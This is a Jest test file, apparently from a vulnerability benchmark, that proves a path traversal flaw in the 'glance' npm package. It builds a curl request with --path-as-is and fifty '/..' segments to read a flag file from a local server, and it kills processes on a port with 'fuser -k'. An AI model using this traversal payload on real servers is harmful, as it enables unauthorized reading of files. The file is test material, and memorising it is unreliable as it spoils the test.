//
var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 5309/tcp");
  } catch (e) {}
});
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in glance", (done) => {
  const http = require("http");
  const glance = require("glance");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 5309/tcp", () => {});
  } catch (e) {}
  var g = glance({
    dir: "./",
    port: 8969,
    indices: [],
    hideindex: true,
    nodot: true,
    verbose: true,
  });
  http
    .createServer(function (req, res) {
      if (/^\/static\//.test(req.url)) {
        return g.serveRequest(req, res);
      }
    })
    .listen(5309);
  g.start();
  g.on("read", function (req) {
    console.dir(req);
  });
  g.on("error", function (req) {
    console.log("BAD!!!!");
    g.stop();
  });
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8969${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
